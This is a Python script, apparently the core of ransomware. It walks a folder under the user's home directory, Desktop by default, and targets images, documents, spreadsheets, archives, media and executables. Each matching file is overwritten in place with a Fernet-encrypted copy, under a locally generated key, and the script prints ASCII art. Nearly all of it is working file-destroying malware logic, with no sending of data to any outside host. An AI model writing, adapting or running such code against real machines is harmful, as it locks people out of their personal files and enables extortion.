import argparse
import os
import pathlib
from cryptography.fernet import Fernet

######################## ARGUMENTS ########################

# We will only encrypt, so no need for key arguments here.
parser = argparse.ArgumentParser(description='Encrypt files in a directory.')
parser.add_argument('-d', '--directory', type=str, metavar='', help='Directory to search for files to encrypt', default='Desktop')
args = parser.parse_args()

######################## FUNCTIONS ########################

def navigate_to_target_directory(directory_name):
    folder_location = pathlib.Path.home() / directory_name
    os.chdir(folder_location)
    return folder_location

def get_files_in_dir(current_directory):
    # Expanded list of file types to include additional formats
    targeted_file_types = [
        '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff',  # Image formats
        '.doc', '.docx', '.odt',  # Document formats
        '.xls', '.xlsx', '.ods',  # Spreadsheet formats
        '.pdf', '.csv', '.txt',  # Text and data formats
        '.zip', '.tar', '.rar', '.7z',  # Archive formats
        '.mp4', '.avi', '.mkv', '.mov', '.wmv',  # Video formats
        '.mp3', '.wav', '.flac',  # Audio formats
        '.ppt', '.pptx',  # Presentation formats
        '.html', '.xml', '.json',  # Web and markup formats
        '.exe', '.bin', '.iso'  # Executable and disk image formats
    ]
    
    file_list = []
    for root, subdirectories, files in os.walk(current_directory):
        for file in files:
            for file_type in targeted_file_types:
                if file_type in file:
                    file_list.append(os.path.join(root, file))
    return file_list

def generate_key():
    key = Fernet.generate_key()
    with open('cryptographic_key.key', 'wb') as key_file:
        key_file.write(key)

def encrypt_files(file_list):
    with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
        cryptographic_key = key_file.read()
    fernet = Fernet(cryptographic_key)
    if file_list:
        for document in file_list:
            with open(document, 'rb') as file:
                document_original = file.read()
            document_criptat = fernet.encrypt(document_original)
            with open(document, 'wb') as encrypted_document:
                encrypted_document.write(document_criptat)
    else:
        print('No document in directory')

######################## DISPLAY ASCII ########################

# Display the ASCII art on the screen
ascii_art = '''
           %%+                    +%%             
          @@@@*                 =@@%@@            
         -@@#%@@=             -@@@##@@            
         +@@###%@@:   #@-    @@@####@@            
         +@@####%@@#@@@@@  %@@%#####@@+           
        .@@#######@@@%#@@@@@@@######@@*           
        .@@############@@#%@@#######@@*           
        .@@##############%@@%#######@@*           
        .@@##########@@@@@@#########@@*           
        .@@#######%@@%*  :%@@%%#####@@*           
        .@@#####%@@*         @@@%###@@*           
        %@@####@@#.           :@@@##@@@.          
      *@@%###%@#.               -@@##%@@%:        
      #@@%#%@@#                  .%@@#@@%:        
     *@@@@#@@=@@@@@@@#     @@@@@@@@ @@%@@@*       
  :@@@%%###@@=@@#  -@@-   #@%  .#@@ @@#@@@:       
  :%@@#####@@#@@%==+@@-   #@@===%@@+@@@@%+        
    :@@@@@@#@@-%@@@@%      %@@@@@#*@%#%%@@+       
      .@@@%##%@+                 @@%##%@@@        
      .@@@@##%@@@%.          .*@@@@#####%@@@      
 -@@@@@@@########@@@@@@@@@@@@@@########%@@%:      
  @@@%################################@@@-        
   :-@@@@@@###@@@@%###########@@@@@####%@@@%      
      *@@%#%@@%%%################%@@@#####@@@:    
    .#@@##%@@#######################@@%@@@%#      
    @@####@@#@%###################@@@@@%@@        
  :@@@@@%@@%#@@##################%@@#%@@%@*       
      @@@@@##%@@#################@@###%@@@@:      
      @@@@####@@%###############@@@####@@:        
      @@@%####@@%###############@@@#####@@        
      *@%#####@@%###############@@@#####%@*       
     *@@#####%@@%###############%@@######@@:      
    :@@######%@@#################@@#######@@
'''

# Print ASCII art
print(ascii_art)

######################## RUNNING THE ENCRYPTION ########################

# Generate a cryptographic key for encryption
generate_key()

# Navigate to the target directory and get files
directory = navigate_to_target_directory(args.directory)
documents = get_files_in_dir(directory)

# Encrypt the files
encrypt_files(documents)
